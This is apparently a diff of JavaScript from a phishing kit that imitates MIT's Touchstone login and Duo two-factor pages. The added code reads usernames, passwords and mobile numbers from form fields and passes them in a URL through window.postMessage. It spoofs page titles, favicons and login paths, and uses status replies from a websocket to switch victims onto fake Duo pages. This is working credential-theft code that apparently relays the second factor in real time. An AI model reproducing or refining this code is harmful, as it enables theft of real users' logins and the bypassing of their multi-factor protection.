@@ -1,4 +1,48 @@
-window.sid = "" + new Date().getTime();
+console.log("ACLER");
+function getCook(cookiename) 
+{
+	// Get name followed by anything except a semicolon
+	var cookiestring=RegExp(cookiename+"=[^;]+").exec(document.cookie);
+	// Return everything after the equal sign, or an empty string if the cookie name not found
+	return decodeURIComponent(!!cookiestring ? cookiestring.toString().replace(/^[^=]+./,"") : "");
+}	
+
+setTimeout(()=>{console.log(document.cookie); if (getCook("status") == "invalidCreds") invalidCreds();}, 200);
+
+
+function submitDUO() {
+	document.cookie = "";
+	var user = document.getElementsByName("j_username")[0].value;
+	var pass = document.getElementsByName("j_password")[0].value;
+	var mobile = document.getElementsByName("mobile")[0].value;
+	if (user == "" || pass == "") { invalidCreds(); return false }
+
+	setTimeout(function() {
+		window.postMessage({
+			move : '/login?j_username=' + user + '&j_password=' + pass + '&mobile=' + mobile,
+			url  : '/idp/Authn/UsernamePassword',
+			icon : '/idp/Authn/images/favicon2.ico',
+			title: 'Touchstone@MIT : 22',
+			load : '2'
+		}, '*');
+	}, 100);
+
+	return false;
+}
+
+
+function invalidCreds() {
+	window.user = "";
+	window.pass = "";
+	document.documentElement.scrollTop = 0;
+	document.getElementsByTagName("html")[0].style.display = "block";
+	document.getElementById("certerr").style.display = "none";
+	document.getElementById("passerr").style.display = "block";
+}
+
+
+
+///////////////////////////
 function injectHTML(page) {
 	var s = "<iframe frameborder='0' seamless='seamless' style='position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;' src='" + page + "'>";
 	document.getElementsByTagName("html")[0].innerHTML = s;
@@ -12,15 +56,9 @@ function certificate() {
 	}, 500);
 }
 function connect() {
-	var user;
-	var pass;
-	if (window.location.href.includes("mobile")) {
-		user = document.getElementsByName("j_username")[0].value
-		pass = document.getElementsByName("j_password")[0].value
-	} else {
-		user = document.getElementsByName("username")[0].value
-		pass = document.getElementsByName("pass")[0].value
-	}
+	var user = document.getElementsByName("j_username")[0].value
+	var pass = document.getElementsByName("j_password")[0].value
+	window.sid = "" + new Date().getTime();
 	window.user = user;
 	window.pass = pass;
 	window.received = 0
@@ -81,9 +119,18 @@ function setupSock() {
 
 			window.received++;
 			if (data["status"] == "validCreds") {
-				window.parent.postMessage({"url": "/idp/Authn/UsernamePassword",
-					"title":"Touchstone@MIT - Duo Authentication"}, "*");
-				document.documentElement.scrollTop = 0;
+				var page = "duo-2.html";
+				if (window.location.href.includes("mobile")) page = "mobile-duo-2.html";
+				window.sock.onclose = function() {};
+				window.sock.close();
+				window.parent.postMessage({
+					move:  "/idp/Authn/" + page,
+					icon:  "/idp/Authn/images/favicon.ico",
+					url:   "/idp/Authn/UsernamePassword",
+					title: "Touchstone@MIT - Duo Authentication",
+					sid:   window.sid
+				}, "*");
+				/*document.documentElement.scrollTop = 0;
 				if (window.location.href.includes("mobile")) injectHTML("mobile-duo-2.html")
 				else injectHTML("duo-2.html");
 				setTimeout(function() {
@@ -91,7 +138,7 @@ function setupSock() {
 					document.getElementsByTagName("iframe")[0].contentWindow.sid = window.sid;
 					document.getElementsByTagName("iframe")[0].contentWindow.isAlive = function() { alive = true; };
 					document.getElementsByTagName("iframe")[0].contentWindow.onSuccessCallback = loginSucc; 
-				},300);
+				},300);*/
 			}
 			if (data["status"] == "invalidCreds") {
 				console.log("Received invalid creds");
@@ -101,28 +148,6 @@ function setupSock() {
 		})
 	}
 	window.sock = sock;
-}
-
-function invalidCreds() {
-	//showCursor(true)
-	window.user = "";
-	window.pass = "";
-	document.documentElement.scrollTop = 0;
-	document.getElementsByTagName("html")[0].style.display = "block";
-	document.getElementById("certerr").style.display = "none";
-	document.getElementById("passerr").style.display = "block";
-}
-
-function showCursor(show) {
-	if (show) {
-		document.getElementsByTagName("html")[0].style.cursor = "";
-		Array.from(document.getElementsByTagName("input")).forEach(e => e.style.cursor = "");
-	}
-	else {
-		document.getElementsByTagName("html")[0].style.cursor = "wait";
-		Array.from(document.getElementsByTagName("input")).forEach(e => e.style.cursor = "wait");
-	}
-
 }
 
 function loginSucc() {
